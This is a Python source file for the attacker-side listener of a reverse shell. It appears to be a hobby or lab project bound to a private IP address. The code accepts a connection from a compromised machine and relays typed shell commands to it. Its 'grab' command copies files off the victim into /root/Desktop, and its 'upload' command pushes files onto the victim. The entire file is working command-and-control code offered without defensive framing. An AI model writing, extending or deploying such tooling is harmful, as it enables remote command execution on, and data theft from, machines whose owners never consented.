import socket, os

def main():
    reciever = Reciever('192.168.159.132', 8080)
    reciever.start()

class Reciever:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        try:
            self.connect()
            self.shell()
        except KeyboardInterrupt:
            try:
                self.conn.send('kill'.encode())
                self.conn.close()
                self.sock.close()
                exit()
            except Exception:
                exit()

    def connect(self):
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.ip, self.port))
        self.sock.listen(1)
        self.conn, self.addr = self.sock.accept()
        return print(f'[+] Connection recieved from {self.addr}')

    def shell(self):
        while True:
            command = input('>> ')
            if 'kill' in command:
                self.conn.send('kill'.encode())
                self.conn.close()
                return
            if command.strip() == '':
                print('No command given...')
                continue
            if 'grab' in command:
                self.transfer(self.conn, command)
                continue
            if 'upload' in command:
                self.upload(self.conn, command)
                continue
            self.conn.send(command.encode())
            print(self.conn.recv(1024).decode())

    def transfer(self, conn, command):
        conn.send(command.encode())
        grab, path = command.split('*')
        f = open(f'/root/Desktop/{path}', 'wb')
        while True:
            bits = conn.recv(1024)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                print('[+] Transfer complete.')
                break
            if 'File not found.'.encode() in bits:
                print('[-] File not found.')
                break
            f.write(bits)
        return

    def upload(self, conn, command):
        upload, path = command.split('*')
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                conn.send(packet)
                packet = f.read(1024)
            conn.send('DONE'.encode())
        else:
            print('File not found.')
        return



if __name__ == '__main__':
    main()